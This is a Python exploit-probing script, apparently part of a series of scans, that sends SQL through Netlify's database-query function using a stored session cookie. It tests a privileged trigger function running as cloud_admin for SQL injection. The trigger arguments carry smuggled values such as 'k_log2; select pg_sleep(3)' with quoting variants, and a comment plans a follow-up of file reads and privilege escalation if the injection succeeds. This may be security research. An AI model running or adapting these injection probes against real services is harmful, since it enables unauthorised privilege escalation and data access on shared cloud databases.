# -*- coding: utf-8 -*-
"""波19:repack_trigger prosecdef 链(cloud_admin 上下文)
K1 正常用法:触发器转发 INSERT 到 log 表(验证以 cloud_admin 执行)
K2 参数注入测试:TG_ARGV 含分号+pg_sleep(计时观察第二条是否执行)
K3 若注入成立:以 cloud_admin 读文件/提权验证(无害:pg_read_file 权限探测)
"""
import http.client, ssl, gzip, brotli, json, sys, time
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_NET

SITE_ID = '04f08ff6-f274-47ac-b6d7-5fb1e055f3b4'
ctx = ssl.create_default_context()
P = '/.netlify/functions/database-query'


def tx(qs, timeout=90):
    t0 = time.time()
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0',
         'Accept-Encoding': 'br, gzip', 'Accept': 'application/json', 'Cookie': COOKIE_NET,
         'Content-Type': 'application/json'}
    body = {'siteId': SITE_ID, 'action': 'transaction', 'queries': [{'sql': x} for x in qs]}
    conn.request('POST', P, body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    conn.close()
    return st, raw[:3000].decode('utf-8', 'ignore'), round(time.time() - t0, 1)


# K1: 正常 repack_trigger 用法
s, b, dt = tx(["drop table if exists k_src", "drop table if exists k_log",
               "create table k_src(id int, v text)",
               "create table k_log(id int, v text)",
               "create trigger k_trg after insert on k_src for each row execute function repack.repack_trigger('k_log')",
               "insert into k_src values (1, 'hello')",
               "select * from k_log"])
print('K1_normal        [%d] %.1fs %s' % (s, dt, b[:800]))

# K2: 注入测试 TG_ARGV = "k_log; select pg_sleep(3)"
s, b, dt = tx(["drop table if exists k_src2", "drop table if exists k_log2",
               "create table k_src2(id int)",
               "create table k_log2(id int)",
               "create trigger k_trg2 after insert on k_src2 for each row execute function repack.repack_trigger('k_log2; select pg_sleep(3)')",
               "insert into k_src2 values (1)"])
print('K2_inject        [%d] %.1fs %s' % (s, dt, b[:800]))
# K2b: 若上面报错,试注入到目标表名(引号变体)
s, b, dt = tx(["drop trigger if exists k_trg3 on k_src2",
               "create trigger k_trg3 after insert on k_src2 for each row execute function repack.repack_trigger('k_log2''; select pg_sleep(3); --')",
               "insert into k_src2 values (2)"])
print('K2b_inject_q     [%d] %.1fs %s' % (s, dt, b[:800]))
# K2c: schema 限定 + 注入
s, b, dt = tx(["drop trigger if exists k_trg4 on k_src2",
               "create trigger k_trg4 after insert on k_src2 for each row execute function repack.repack_trigger('public.k_log2; select pg_sleep(3)')",
               "insert into k_src2 values (3)"])
print('K2c_inject_sch   [%d] %.1fs %s' % (s, dt, b[:800]))
# K3: 清理
s, b, dt = tx(["drop table if exists k_src", "drop table if exists k_log",
               "drop table if exists k_src2", "drop table if exists k_log2"])
print('K3_cleanup       [%d] %.1fs %s' % (s, dt, b[:300]))
